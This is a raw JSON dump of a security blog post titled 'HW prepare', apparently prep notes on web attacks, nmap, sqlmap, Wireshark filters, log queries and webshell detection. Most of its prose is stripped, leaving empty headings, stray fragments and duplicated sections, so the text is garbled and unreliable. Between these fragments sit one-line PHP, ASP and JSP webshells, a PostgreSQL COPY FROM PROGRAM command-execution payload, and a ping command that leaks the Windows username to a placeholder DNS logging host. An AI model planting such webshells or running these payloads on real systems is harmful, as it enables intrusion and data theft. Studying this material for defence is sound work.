Request Forgery),SSRF</p>\n<p></p>\n<p>1web</p>\n<p>2</p>\n<p>380,443,8080,8090</p>\n<p>4httphttpsfile:&#x2F;&#x2F;&#x2F;,gopher:&#x2F;&#x2F;,ftp:&#x2F;&#x2F;</p>\n<p>5DNSHost</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>Watering Hole Attack</p>\n<p></p>\n<p>1    </p>\n<p>2    </p>\n<p>3    </p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p></p>\n<h3 id=\"tomcat\"><a href=\"#tomcat\" class=\"headerlink\" title=\"tomcat\"></a>tomcat</h3><p>jsp html htm js css xml gif jpg png pdf doc xls</p>\n<h3 id=\"ssrf\"><a href=\"#ssrf\" class=\"headerlink\" title=\"ssrf\"></a>ssrf</h3><p>http https ftp smtp dns file </p>\n<h3 id=\"mysql\"><a href=\"#mysql\" class=\"headerlink\" title=\"mysql\"></a>mysql</h3><h3 id=\"nmap\"><a href=\"#nmap\" class=\"headerlink\" title=\"nmap\"></a>nmap</h3><ul>\n<li>-sS (TCP SYN)root TCPSYN </li>\n<li>-sT SYNTCP Connect()TCPtcp connect()SYN</li>\n<li>-sP pingNmappingNmap</li>\n<li>-sU UDPUDP</li>\n<li>-sA  open() open|filtered()) </li>\n<li>-sV </li>\n<li>-Pn pingping</li>\n<li>-v </li>\n<li>-p 1-6553514331352280</li>\n<li>-O </li>\n<li>-O osscan-limit </li>\n<li>-O osscan-guess NmapNmap </li>\n<li>-A </li>\n<li>-oN&#x2F;-oX&#x2F;-oG XMLgrepable </li>\n<li>-iL -iL C:\\ip.txt</li>\n</ul>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><ul>\n<li></li>\n<li> IP </li>\n<li></li>\n<li> SQL XSS </li>\n<li></li>\n<li></li>\n<li></li>\n</ul>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>TianEye Log Query Syntax</p>\n<ol>\n<li>202241430</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">index=xxx sourcetype=yyy access_time&gt;=2022-04-01 access_time&lt;=2022-04-30</span><br></pre></td></tr></table></figure>\n\n<p> IP  192.168.1.100 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">index=xxx sourcetype=yyy client_ip=192.168.1.100</span><br></pre></td></tr></table></figure>\n\n<p> IP  192.168.1.100202241430</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">index=xxx sourcetype=yyy client_ip=192.168.1.100 access_time&gt;=2022-04-01 access_time&lt;=2022-04-30</span><br></pre></td></tr></table></figure>\n\n<p> HTTP  10  IP </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">index=xxx sourcetype=yyy access_time&gt;=2022-04-01 access_time&lt;=2022-04-30 | top 10 client_ip</span><br></pre></td></tr></table></figure>\n\n<p> HTTP  10  IP </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">index=xxx sourcetype=yyy access_time&gt;=2022-04-01 access_time&lt;=2022-04-30 | </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p></p>\n<ol>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n</ol>\n<h3 id=\"0day\"><a href=\"#0day\" class=\"headerlink\" title=\"0day\"></a>0day</h3><p></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><ol>\n<li> Windows </li>\n<li></li>\n<li> Windows Active DirectoryDNS</li>\n<li> Windows </li>\n</ol>\n<h3 id=\"webshell\"><a href=\"#webshell\" class=\"headerlink\" title=\"webshell\"></a>webshell</h3><ul>\n<li>WebshellWebshell</li>\n<li>Webshelleval(base64_decode(WebshellWebshell</li>\n<li>WebshellWebshell</li>\n<li>WebshellWebshell</li>\n<li>WebshellWebshell</li>\n</ul>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><ul>\n<li><p>89 ldap <br>LdapBrowser</p>\n</li>\n<li><p>1433 Mssql<br>getshellSA</p>\n</li>\n<li><p>1521 Oracle<br>&#x2F;</p>\n</li>\n<li><p>3306 MySQL<br>webshelludfmof</p>\n</li>\n<li><p>5432  PostgreSQL<br>postgresPoC DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM id; SELECT * FROM cmd_exec;</p>\n</li>\n<li><p>5984 CouchDB<br>http:&#x2F;&#x2F;:5984&#x2F;_utils</p>\n</li>\n<li><p>6379 Redis<br>webshell shellrootRCE</p>\n</li>\n<li><p>9200 elasticsearch</p>\n</li>\n</ul>\n<h3 id=\"ip\"><a href=\"#ip\" class=\"headerlink\" title=\"ip\"></a>ip</h3><ol>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n</ol>\n<h3 id=\"ip114-114-114-11453\"><a href=\"#ip114-114-114-11453\" class=\"headerlink\" title=\"ip114.114.114.11453\"></a>ip114.114.114.11453</h3><h3 id=\"exe\"><a href=\"#exe\" class=\"headerlink\" title=\"exe\"></a>exe</h3><ol>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n</ol>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><ol>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n</ol>\n<h3 id=\"cs\"><a href=\"#cs\" class=\"headerlink\" title=\"cs\"></a>cs</h3><p></p>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/zzwwhhpp/article/details/111773395\" >https://blog.csdn.net/zzwwhhpp/article/details/111773395<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"wireshark\"><a href=\"#wireshark\" class=\"headerlink\" title=\"wireshark\"></a>wireshark</h3><p>ip.src eq 192.168.1.107 or ip.dst eq 192.168.1.107</p>\n<p></p>\n<p>ip.addr eq 192.168.1.107 &#x2F;&#x2F; IPIP</p>\n<p>tcp.port eq 80 &#x2F;&#x2F; </p>\n<p>tcp.port &#x3D;&#x3D; 80</p>\n<p>tcp.port eq 2722</p>\n<p>tcp.port eq 80 or udp.port eq 80</p>\n<p>tcp.dstport &#x3D;&#x3D; 80 &#x2F;&#x2F; tcp80</p>\n<p>tcp.srcport &#x3D;&#x3D; 80 &#x2F;&#x2F; tcp80</p>\n<p> udp.port eq 15000</p>\n<p> </p>\n<p>tcp.port &gt;&#x3D; 1 and tcp.port &lt;&#x3D; 80</p>\n<p>th.dst &#x3D;&#x3D; A0:00:00:04:C5:84 &#x2F;&#x2F; mac</p>\n<p>eth.src eq A0:00:00:04:C5:84 &#x2F;&#x2F; mac</p>\n<p>eth.dst&#x3D;&#x3D;A0:00:00:04:C5:84</p>\n<p>eth.dst&#x3D;&#x3D;A0-00-00-04-C5-84</p>\n<p>eth.addr eq A0:00:00:04:C5:84 &#x2F;&#x2F; MACMACA0:00:00:04:C5:84</p>\n<p>http.request.method &#x3D;&#x3D; GET</p>\n<p>http.request.method &#x3D;&#x3D; POST</p>\n<p>http.request.uri &#x3D;&#x3D; &#x2F;img&#x2F;logo-edu.gif</p>\n<p>http contains GET</p>\n<p>http contains HTTP&#x2F;1.</p>\n<h3 id=\"shiro\"><a href=\"#shiro\" class=\"headerlink\" title=\"shiro\"></a>shiro</h3><p>1.1.3 </p>\n<p>Apache ShiroRememberMecookiecookiekeyRememberMecookieAESBase64cookie</p>\n<p>ShiroCookie</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>1. user-agent  antsword xxx</p>\n<p> 2.URLini_set(display_errors,0);</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><ul>\n<li></li>\n<li></li>\n<li>2017WannaCry445</li>\n<li></li>\n<li>U</li>\n</ul>\n<h3 id=\"log4j\"><a href=\"#log4j\" class=\"headerlink\" title=\"log4j\"></a>log4j</h3><p>log4jJNDIRCE</p>\n<h3 id=\"wireshark\"><a href=\"#wireshark\" class=\"headerlink\" title=\"wireshark\"></a>wireshark</h3><h3 id=\"redis-mongodb\"><a href=\"#redis-mongodb\" class=\"headerlink\" title=\"redis mongodb\"></a>redis mongodb</h3><p>redis 6379   </p>\n<p>mongoDB 27017</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"struct2\"><a href=\"#struct2\" class=\"headerlink\" title=\"struct2\"></a>struct2</h3><p>Struts2action:redirect:redirectAction:OgnlURLOgnlURLJava</p>\n<h3 id=\"-x-X-x-x-win7win8\"><a href=\"#-x-X-x-x-win7win8\" class=\"headerlink\" title=\": x.X.x.x,win7win8\"></a>: x.X.x.x,win7win8</h3><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"sql\"><a href=\"#sql\" class=\"headerlink\" title=\"sql\"></a>sql</h3><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"php\"><a href=\"#php\" class=\"headerlink\" title=\"php\"></a>php</h3><p><strong>system()passthru()exec()pcntl_exec()shell_exec()popen()&#x2F;proc_popen() &#96;&#96;</strong></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>Accept: application&#x2F;json, text&#x2F;javascript, <em>&#x2F;</em>; q&#x3D;0.01</p>\n<p>Content-type: Application&#x2F;x-www-form-urlencoded</p>\n<p>10User-Agent,shell</p>\n<p>webshelljavawtcp49700</p>\n<p>$post&#x3D;Decrypt(file_get_contents(php:&#x2F;&#x2F;input));</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>Accepttext&#x2F;html, image&#x2F;gif, image&#x2F;jpeg, *; q&#x3D;.2, <em>&#x2F;</em>; q&#x3D;.2</p>\n<p>cookie</p>\n<p>base64rawbase64base64base64</p>\n<p>32md5base64md5+base64+md5<br>md50123456789ABCDEF(?i:[0-9A-F]{16})[\\w+&#x2F;]{4,}&#x3D;?&#x3D;?(?i:[0-9A-F]{16})md5JAVAwebshellPHP</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>&#x2F;var&#x2F;log&#x2F;</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p></p>\n<ol>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n</ol>\n<p>JavaJava Security ManagerJava</p>\n<h3 id=\"urlSQL\"><a href=\"#urlSQL\" class=\"headerlink\" title=\"urlSQL\"></a>urlSQL</h3><p>SQLSQL</p>\n<h3 id=\"-\"><a href=\"#-\" class=\"headerlink\" title=\" \"></a> </h3><p></p>\n<ol>\n<li>IP</li>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n</ol>\n<p></p>\n<ol>\n<li></li>\n<li></li>\n<li>WAF</li>\n</ol>\n<p></p>\n<h3 id=\"linux\"><a href=\"#linux\" class=\"headerlink\" title=\"linux\"></a>linux</h3><p>Linux</p>\n<ol>\n<li>&#x2F;tmpLinux</li>\n<li>&#x2F;var&#x2F;tmp&#x2F;tmp</li>\n<li>&#x2F;dev&#x2F;shmramfs&#x2F;dev&#x2F;shm</li>\n</ol>\n<p>Apache&#x2F;var&#x2F;cache&#x2F;httpdNginx&#x2F;var&#x2F;run&#x2F;nginx&#x2F;client_body_temp</p>\n<p></p>\n<h3 id=\"sql\"><a href=\"#sql\" class=\"headerlink\" title=\"sql\"></a>sql</h3><p>SQL</p>\n<ol>\n<li></li>\n<li>SQL</li>\n<li>SQL</li>\n<li></li>\n<li>SQL</li>\n</ol>\n<p>SQLWAF</p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":" || ","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]}},"links":[{"name":"dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h1 id=\"HW-prepare\"><a href=\"#HW-prepare\" class=\"headerlink\" title=\"HW prepare\"></a>HW prepare</h1><h3 id=\"hw\"><a href=\"#hw\" class=\"headerlink\" title=\"hw\"></a>hw</h3><p></p>\n<p>hw</p>\n<h3 id=\"hw\"><a href=\"#hw\" class=\"headerlink\" title=\"hw\"></a>hw</h3><p>WAFIPS7*24</p>\n<p></p>\n<p>IP</p>\n<p></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><ul>\n<li></li>\n<li>DDDOS</li>\n<li>GLBLLBSLBGLBLLBSLB</li>\n<li>WAF<a class=\"link\"   href=\"https://cloud.tencent.com/product/waf?from=20065&from_column=20065\" >web<i class=\"fas fa-external-link-alt\"></i></a>WEB</li>\n<li></li>\n<li><a class=\"link\"   href=\"https://cloud.tencent.com/product/vds?from=20065&from_column=20065\" ><i class=\"fas fa-external-link-alt\"></i></a>WEB</li>\n<li>WAFwebWEB</li>\n<li></li>\n<li>ICT</li>\n</ul>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"pdfxxe\"><a href=\"#pdfxxe\" class=\"headerlink\" title=\"pdfxxe\"></a>pdfxxe</h3><p>PDF  XXEXML  PDF  XML  PDF  XML </p>\n<h3 id=\"httpmethoddata\"><a href=\"#httpmethoddata\" class=\"headerlink\" title=\"httpmethoddata\"></a>httpmethoddata</h3><p>\t\t<br>GET\t\t<br>HEAD\t\t<br>POST\t\t<br>PUT\t\t<br>TRACE\t\t<br>OPTIONS\t\t<br>DELETE\t\t</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"sql\"><a href=\"#sql\" class=\"headerlink\" title=\"sql\"></a>sql</h3><ul>\n<li>SQL</li>\n<li>SQL &#x2F;&#x2F;WAF</li>\n<li> \\select</li>\n<li> </li>\n<li> </li>\n<li></li>\n</ul>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"DNS\"><a href=\"#DNS\" class=\"headerlink\" title=\"DNS\"></a>DNS</h3><ul>\n<li><p>sql</p>\n</li>\n<li><p>XSS</p>\n</li>\n<li><p></p>\n</li>\n<li><p>windows</p>\n<p>ping %USERNAME%.XXX.CEYE.IO</p>\n</li>\n<li><p>xxe</p>\n</li>\n<li><p>ssrf</p>\n</li>\n</ul>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p></p>\n<h3 id=\"socket\"><a href=\"#socket\" class=\"headerlink\" title=\"socket\"></a>socket</h3><blockquote>\n<p> Websocket  bufferedAmount </p>\n<ol>\n<li>Client  Websocket  Server </li>\n<li>Server  connect  TCP  window size  0 Client  server</li>\n<li>Client  websocket.send()</li>\n<li> Client  websocket.bufferedAmount <br> TCP  Client </li>\n</ol>\n</blockquote>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php @eval($_POST[1]);?&gt;    php</span><br><span class=\"line\">&lt;%eval request(&quot;chopper&quot;)%&gt;   asp</span><br><span class=\"line\"> &lt;%Process process = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));%&gt;  jsp</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><ul>\n<li> </li>\n<li></li>\n</ul>\n<h3 id=\"fastjson\"><a href=\"#fastjson\" class=\"headerlink\" title=\"fastjson\"></a>fastjson</h3><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>IIS</p>\n<ul>\n<li></li>\n<li>put</li>\n<li></li>\n</ul>\n<p>apache</p>\n<ul>\n<li></li>\n<li>addhandler</li>\n<li></li>\n</ul>\n<p>nginx</p>\n<ul>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n</ul>\n<p>tomcat</p>\n<ul>\n<li></li>\n<li></li>\n<li>+getshell</li>\n</ul>\n<p>jboss</p>\n<ul>\n<li></li>\n<li></li>\n</ul>\n<h3 id=\"ngsoc\"><a href=\"#ngsoc\" class=\"headerlink\" title=\"ngsoc\"></a>ngsoc</h3><p>NGSOC</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"windowslinux\"><a href=\"#windowslinux\" class=\"headerlink\" title=\"windowslinux\"></a>windowslinux</h3><p>linuxdebian linux</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>2017</p>\n<p>WindowsSMB 139445</p>\n<h3 id=\"sql\"><a href=\"#sql\" class=\"headerlink\" title=\"sql\"></a>sql</h3><p>load_file() into outfile &#x2F; into dumpfile</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>GBKGBK</p>\n<p>mysqlGBKASCII128</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>vpnShadowsocksTrojanWireGuard</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>Apache StrutsRDPSSH</p>\n<p></p>\n<p></p>\n<p></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><ol>\n<li></li>\n<li></li>\n<li>HTTP</li>\n<li></li>\n</ol>\n<h3 id=\"sql\"><a href=\"#sql\" class=\"headerlink\" title=\"sql\"></a>sql</h3><ul>\n<li>SQL</li>\n<li>SQL &#x2F;&#x2F;WAF</li>\n<li> \\select</li>\n<li> </li>\n<li> </li>\n<li></li>\n</ul>\n<h3 id=\"ngsoc\"><a href=\"#ngsoc\" class=\"headerlink\" title=\"ngsoc\"></a>ngsoc</h3><p>NGSOC</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><ul>\n<li><p> (  0x00  IIS6.0  )</p>\n</li>\n<li><p> (  ),  :  .</p>\n</li>\n<li><p> MIME (  GIF  MIME image&#x2F;gif,CSS  MIME text&#x2F;css  ) 3.  (  webshell)</p>\n</li>\n<li><p> (  ,  )</p>\n</li>\n<li><p> (  ,  webshell  )</p>\n</li>\n<li><p></p>\n</li>\n</ul>\n<h3 id=\"xff\"><a href=\"#xff\" class=\"headerlink\" title=\"xff\"></a>xff</h3><p>x-forwarded-for HTTPIP</p>\n<p>sql</p>\n<h3 id=\"sql\"><a href=\"#sql\" class=\"headerlink\" title=\"sql\"></a>sql</h3><ul>\n<li>web</li>\n<li></li>\n<li>sql</li>\n<li>secure_file_privFile_priv</li>\n</ul>\n<h3 id=\"sqlmap\"><a href=\"#sqlmap\" class=\"headerlink\" title=\"sqlmap\"></a>sqlmap</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-h                  </span><br><span class=\"line\">-hh                 </span><br><span class=\"line\">-v                  0~61</span><br><span class=\"line\">-u url              url</span><br><span class=\"line\">--data=DATA         POST</span><br><span class=\"line\">-r file.txt         POST</span><br><span class=\"line\">-p / --skip         /</span><br><span class=\"line\">--cookie            cookie</span><br><span class=\"line\">--force-ssl         SSL</span><br><span class=\"line\">--threads           </span><br><span class=\"line\">--prefix            </span><br><span class=\"line\">--suffix            </span><br><span class=\"line\">--level             1~51</span><br><span class=\"line\">--risk              1~41</span><br><span class=\"line\">--all               </span><br><span class=\"line\">--banner            </span><br><span class=\"line\">--current-user      </span><br><span class=\"line\">--current-db        </span><br><span class=\"line\">--hostname          </span><br><span class=\"line\">--is-dba            </span><br><span class=\"line\">--users             </span><br><span class=\"line\">--dbs               </span><br><span class=\"line\">-D DB               </span><br><span class=\"line\">--tables            -D</span><br><span class=\"line\">-T table            -D</span><br><span class=\"line\">--columns           -D -T</span><br><span class=\"line\">-C column           -D -T</span><br><span class=\"line\">--dump              </span><br><span class=\"line\">--dump-all          </span><br><span class=\"line\">--count             </span><br><span class=\"line\">--search            -D -T-C </span><br><span class=\"line\">--sql-query         SQL</span><br><span class=\"line\">--sql-shell         SQL</span><br><span class=\"line\">--flie-read         </span><br><span class=\"line\">--file-write        </span><br><span class=\"line\">--file-dest         </span><br><span class=\"line\">--os-cmd            </span><br><span class=\"line\">--os-shell          shell</span><br><span class=\"line\">--batch             </span><br><span class=\"line\">--wizard            </span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"csrf\"><a href=\"#csrf\" class=\"headerlink\" title=\"csrf\"></a>csrf</h3><p></p>\n<p>CSRF  :</p>\n<pre><code>   1 .  A cookie\n\n   2 .  A  cookie  B (B A)\n\n   3 .  A  CSRF \n</code></pre>\n<p><strong></strong></p>\n<p>CSRFRefererCSRF</p>\n<p><strong></strong></p>\n<ol>\n<li> HTTP Referer </li>\n<li> token </li>\n<li> HTTP </li>\n<li>Chrome  SameSite cookie</li>\n</ol>\n<h3 id=\"ssrf\"><a href=\"#ssrf\" class=\"headerlink\" title=\"ssrf\"></a>ssrf</h3><p>(Server-Side Request Forgery),SSRF</p>\n<p></p>\n<p>1web</p>\n<p>2</p>\n<p>380,443,8080,8090</p>\n<p>4httphttpsfile:&#x2F;&#x2F;&#x2F;,gopher:&#x2F;&#x2F;,ftp:&#x2F;&#x2F;</p>\n<p>5DNSHost</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>Watering Hole Attack</p>\n<p></p>\n<p>1    </p>\n<p>2    </p>\n<p>3    </p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p></p>\n<h3 id=\"tomcat\"><a href=\"#tomcat\" class=\"headerlink\" title=\"tomcat\"></a>tomcat</h3><p>jsp html htm js css xml gif jpg png pdf doc xls</p>\n<h3 id=\"ssrf\"><a href=\"#ssrf\" class=\"headerlink\" title=\"ssrf\"></a>ssrf</h3><p>http https ftp smtp dns file </p>\n<h3 id=\"mysql\"><a href=\"#mysql\" class=\"headerlink\" title=\"mysql\"></a>mysql</h3><h3 id=\"nmap\"><a href=\"#nmap\" class=\"headerlink\" title=\"nmap\"></a>nmap</h3><ul>\n<li>-sS (TCP SYN)root TCPSYN </li>\n<li>-sT SYNTCP Connect()TCPtcp connect()SYN</li>\n<li>-sP pingNmappingNmap</li>\n<li>-sU UDPUDP</li>\n<li>-sA  open() open|filtered()) </li>\n<li>-sV </li>\n<li>-Pn pingping</li>\n<li>-v </li>\n<li>-p 1-6553514331352280</li>\n<li>-O </li>\n<li>-O osscan-limit </li>\n<li>-O osscan-guess NmapNmap </li>\n<li>-A </li>\n<li>-oN&#x2F;-oX&#x2F;-oG XMLgrepable </li>\n<li>-iL -iL C:\\ip.txt</li>\n</ul>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><ul>\n<li></li>\n<li> IP </li>\n<li></li>\n<li> SQL XSS </li>\n<li></li>\n<li></li>\n<li></li>\n</ul>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>TianEye Log Query Syntax</p>\n<ol>\n<li>202241430</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">index=xxx sourcetype=yyy access_time&gt;=2022-04-01 access_time&lt;=2022-04-30</span><br></pre></td></tr></table></figure>\n\n<p> IP  192.168.1.100 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">index=xxx sourcetype=yyy client_ip=192.168.1.100</span><br></pre></td></tr></table></figure>\n\n<p> IP  192.168.1.100202241430</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">index=xxx sourcetype=yyy client_ip=192.168.1.100 access_time&gt;=2022-04-01 access_time&lt;=2022-04-30</span><br></pre></td></tr></table></figure>\n\n<p> HTTP  10  IP </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">index=xxx sourcetype=yyy access_time&gt;=2022-04-01 access_time&lt;=2022-04-30 | top 10 client_ip</span><br></pre></td></tr></table></figure>\n\n<p> HTTP  10  IP </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">index=xxx sourcetype=yyy access_time&gt;=2022-04-01 access_time&lt;=2022-04-30 | </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p></p>\n<ol>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n</ol>\n<h3 id=\"0day\"><a href=\"#0day\" class=\"headerlink\" title=\"0day\"></a>0day</h3><p></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><ol>\n<li> Windows </li>\n<li></li>\n<li> Windows Active DirectoryDNS</li>\n<li> Windows </li>\n</ol>\n<h3 id=\"webshell\"><a href=\"#webshell\" class=\"headerlink\" title=\"webshell\"></a>webshell</h3><ul>\n<li>WebshellWebshell</li>\n<li>Webshelleval(base64_decode(WebshellWebshell</li>\n<li>WebshellWebshell</li>\n<li>WebshellWebshell</li>\n<li>WebshellWebshell</li>\n</ul>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><ul>\n<li><p>89 ldap <br>LdapBrowser</p>\n</li>\n<li><p>1433 Mssql<br>getshellSA</p>\n</li>\n<li><p>1521 Oracle<br>&#x2F;</p>\n</li>\n<li><p>3306 